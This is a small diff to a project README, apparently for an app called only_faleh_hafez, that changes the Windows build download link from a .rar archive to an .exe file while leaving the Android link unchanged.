@@ -48,7 +48,7 @@ samples, guidance on mobile development, and a full API reference.
 
 ## Downloads
 
-- [Download latest Windows build](https://github.com/MMDREZA7/only_faleh_hafez/releases/download/Windows/x64.rar)
+- [Download latest Windows build](https://github.com/MMDREZA7/only_faleh_hafez/releases/download/Windows/omen.exe)
 - [Download latest Android build](https://github.com/MMDREZA7/only_faleh_hafez/releases/download/Android/app-release.apk)
 
 ## About the Developer
